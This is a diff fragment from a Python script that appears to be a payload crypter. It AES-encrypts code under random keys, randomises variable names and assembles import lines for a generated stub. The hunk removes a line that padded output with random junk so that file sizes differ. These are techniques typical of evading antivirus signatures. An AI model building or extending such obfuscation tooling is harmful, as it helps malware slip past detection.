@@ -41,7 +41,6 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv = randKey(32), randKey(16)
 bd64var, AESvar = randVar(), randVar()
-junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
 myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os', 'import threading']
 
 	
